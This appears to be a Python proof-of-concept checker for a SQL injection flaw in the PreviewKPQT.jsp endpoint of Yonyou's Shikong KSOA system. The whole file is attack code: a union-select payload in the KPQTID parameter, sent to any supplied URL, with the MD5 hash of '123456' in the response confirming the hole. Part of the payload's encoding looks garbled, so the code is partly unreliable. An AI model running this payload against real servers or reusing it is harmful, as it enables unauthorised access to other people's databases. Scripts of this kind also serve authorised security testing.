import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友时空KSOA系统接口PreviewKPQT.jsp存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    }
    vurl = urllib.parse.urljoin(url, "/kp/PreviewKPQT.jsp?KPQType=KPQT&KPQTID=1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%123456%27)),2,3+--+")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult